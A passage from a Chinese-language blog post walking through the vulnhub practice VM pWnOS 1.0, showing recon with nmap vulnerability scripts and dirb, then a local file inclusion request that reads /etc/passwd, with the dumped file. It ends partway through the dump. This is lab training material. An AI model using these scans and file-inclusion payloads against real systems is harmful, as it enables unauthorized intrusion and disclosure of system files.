@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="发布日期名称：pWnOS：1.0发布日期：2008年6月27日 Readme.txt感谢您尝试使用pWnOS 1.0。开始之前需要注意的几件事。 pWnOS是使用VMware Workstation制作的，可以通过下载VMware Server或Vmware Player来启动…两者都是免费的！或免费的VMware Workstation（Windows）或VMware Fusion（OS X）。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[pWnOS-1.0]">
+<meta property="og:url" content="https://fdlucifer.github.io/2019/12/29/pWnOS-1/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="发布日期名称：pWnOS：1.0发布日期：2008年6月27日 Readme.txt感谢您尝试使用pWnOS 1.0。开始之前需要注意的几件事。 pWnOS是使用VMware Workstation制作的，可以通过下载VMware Server或Vmware Player来启动…两者都是免费的！或免费的VMware Workstation（Windows）或VMware Fusion（OS X）。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub119.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub120.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2019-12-29T07:10:49.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:55:38.201Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub119.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2019/12/29/pWnOS-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2019/12/29/pWnOS-1/","path":"2019/12/29/pWnOS-1/","title":"vulnhub靶机渗透[pWnOS-1.0]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[pWnOS-1.0] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E5%B8%83%E6%97%A5%E6%9C%9F"><span class="nav-number">1.</span> <span class="nav-text">发布日期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Readme-txt"><span class="nav-number">2.</span> <span class="nav-text">Readme.txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD"><span class="nav-number">3.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">4.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">5.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AC%E5%90%9110000%E7%AB%AF%E5%8F%A3%E7%9A%84webmin"><span class="nav-number">6.</span> <span class="nav-text">转向10000端口的webmin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#john%E7%A0%B4%E8%A7%A3hash%E5%80%BC"><span class="nav-number">7.</span> <span class="nav-text">john破解hash值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">8.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">9.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%832"><span class="nav-number">10.</span> <span class="nav-text">提权2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#other-way-to-get-shell-and-privilege-escalate-by-using-msf"><span class="nav-number">11.</span> <span class="nav-text">other way to get shell and privilege escalate by using msf</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2019/12/29/pWnOS-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[pWnOS-1.0] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[pWnOS-1.0]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2019-12-29 15:10:49" itemprop="dateCreated datePublished" datetime="2019-12-29T15:10:49+08:00">2019-12-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:55:38" itemprop="dateModified" datetime="2020-08-17T00:55:38+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>名称：pWnOS：1.0<br>发布日期：2008年6月27日</p>
+<h3 id="Readme-txt"><a href="#Readme-txt" class="headerlink" title="Readme.txt"></a>Readme.txt</h3><p>感谢您尝试使用pWnOS 1.0。开始之前需要注意的几件事。 pWnOS是使用VMware Workstation制作的，可以通过下载VMware Server或Vmware Player来启动…两者都是免费的！或免费的VMware Workstation（Windows）或VMware Fusion（OS X）。</p>
+<p>1.如果Vmware在首次引导时询问您是复制还是移动了该虚拟机，请单击MOVED！否则，网络设置可能会混乱。<br>2.当前已将虚拟机设置为使用桥接网络，但是您可能希望根据自己的喜好将其更改为NAT或“仅主机”。<br>3.可以在milw0rm.com上找到所有必需的工具&#x2F;漏洞&#x2F;所有内容。<br>4.有多种途径可以访问外壳。我创建了一个n00b路径和一个更高级的路径。看看是否可以同时获得它们！<br>我将pWnOS的难度评定为与De-Ice的2级磁盘大致相同…可能要困难一些。有关De-Ice渗透测试磁盘的信息，请参见<span class="exturl" data-url="aHR0cDovL3d3dy5kZS1pY2UubmV0Li8=">http://www.de-ice.net。<i class="fa fa-external-link-alt"></i></span><br>我希望你喜欢它！如果您有任何疑问或反馈，请给我发送电子邮件至<span class="exturl" data-url="bWFpbHRvOiYjeDYyOyYjMTExOyYjeDZlOyYjMTAwOyYjNDg7JiN4MzA7JiN4NDA7JiMxMDM7JiN4NmQ7JiM5NzsmI3g2OTsmI3g2YzsmI3gyZTsmI3g2MzsmI3g2ZjsmI3g2ZDs=">&#x62;&#111;&#x6e;&#100;&#48;&#x30;&#x40;&#103;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;<i class="fa fa-external-link-alt"></i></span><br>bond00</p>
+<span id="more"></span>
+
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
+<li>Download: <span class="exturl" data-url="aHR0cDovL3B3bm9zLmNvbS9maWxlcy9wV25PU192MS4wLnppcA==">http://pwnos.com/files/pWnOS_v1.0.zip<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9wd25vcy9wV25PU192MS4wLnppcA==">https://download.vulnhub.com/pwnos/pWnOS_v1.0.zip<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9wd25vcy9wV25PU192MS4wLnppcC50b3JyZW50">https://download.vulnhub.com/pwnos/pWnOS_v1.0.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>你们中有些人可能已经注意到了这个新的pWnOS论坛部分。 我创建了pWnOS作为虚拟机，而Grendel很好，我可以在这里发布它。 这是有关pWnOS的一些信息。<br>这是一个有意配置有可利用服务的linux虚拟机，可为您提供通往r00t的路径。 :)当前，虚拟机NIC是在桥接网络中配置的，因此它将在您连接到的网络上获得一个正常的IP地址。 您可以根据需要轻松地将其更改为NAT或仅主机。 快速ping扫描将显示虚拟机的IP地址。<br>对不起…没有任何场景&#x2F;故事情节。 我并不是真的打算这样发布它，所以也许对于2.0版，我会更具创造力。 :)我很想得到反馈，所以请告诉我它的进展或您有任何疑问。 谢谢，祝你好运！<br>资料来源：<span class="exturl" data-url="aHR0cDovL2ZvcnVtcy5oYWNraW5nZG9qby5jb20vdmlld3RvcGljLnBocD9mPTIxJnQ9MTQ5">http://forums.hackingdojo.com/viewtopic.php?f=21&amp;t=149<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.33.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (192.168.33.3)</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: 00:0C:29:5E:18:C9 (VMware)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sT -Pn -n -vv 192.168.33.3 -p- -sC --script=vuln</span></span><br><span class="line">PORT      STATE SERVICE          REASON</span><br><span class="line">22/tcp    open  ssh              syn-ack</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp    open  http             syn-ack</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /icons/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6&#x27;</span></span><br><span class="line">|   /index/: Potentially interesting folder</span><br><span class="line">|_  /php/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6&#x27;</span></span><br><span class="line">|_http-jsonp-detection: Couldn<span class="string">&#x27;t find any JSONP endpoints.</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;</span>s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| http-trace: TRACE is enabled</span></span><br><span class="line"><span class="string">| Headers:</span></span><br><span class="line"><span class="string">| Date: Sun, 29 Dec 2019 08:21:03 GMT</span></span><br><span class="line"><span class="string">| Server: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6</span></span><br><span class="line"><span class="string">| Connection: close</span></span><br><span class="line"><span class="string">| Transfer-Encoding: chunked</span></span><br><span class="line"><span class="string">|_Content-Type: message/http</span></span><br><span class="line"><span class="string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#x27;</span>t find wp-login.php</span><br><span class="line">139/tcp   open  netbios-ssn      syn-ack</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">445/tcp   open  microsoft-ds     syn-ack</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">10000/tcp open  snet-sensor-mgmt syn-ack</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-vuln-cve2006-3392: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Webmin File Disclosure</span><br><span class="line">|     State: VULNERABLE (Exploitable)</span><br><span class="line">|     IDs:  CVE:CVE-2006-3392</span><br><span class="line">|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path <span class="keyword">function</span> before decoding HTML.</span><br><span class="line">|       This allows arbitrary files to be <span class="built_in">read</span>, without requiring authentication, using <span class="string">&quot;..%01&quot;</span> sequences</span><br><span class="line">|       to bypass the removal of <span class="string">&quot;../&quot;</span> directory traversal sequences.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2006-06-29</span><br><span class="line">|     References:</span><br><span class="line">|       http://www.exploit-db.com/exploits/1997/</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392</span><br><span class="line">|_      http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">|_smb-vuln-ms10-061: <span class="literal">false</span></span><br><span class="line">|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>
+
+<p>上dirb</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.33.3/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Tue Dec 31 02:00:48 2019</span><br><span class="line">URL_BASE: http://192.168.33.3/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.33.3/ ----</span><br><span class="line">+ http://192.168.33.3/cgi-bin/ (CODE:403|SIZE:306)                                                    </span><br><span class="line">+ http://192.168.33.3/index (CODE:200|SIZE:295)                                                       </span><br><span class="line">+ http://192.168.33.3/index.php (CODE:200|SIZE:295)                                                   </span><br><span class="line">+ http://192.168.33.3/index1 (CODE:200|SIZE:1104)                                                     </span><br><span class="line">+ http://192.168.33.3/index2 (CODE:200|SIZE:156)                                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.33.3/php/</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;php目录有一个phpmyadmin，但是需要密码，除此之外没有太多可用的信息。</p>
+<p>构造如下poc，观察返回结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.33.3/index1.php?<span class="built_in">help</span>=<span class="literal">true</span>&amp;connect=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub119.jpg"></p>
+<p>说明存在本地文件包含漏洞LFI</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh <span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh dhcp:x:100:101::/nonexistent:/bin/false syslog:x:101:102::/home/syslog:/bin/false 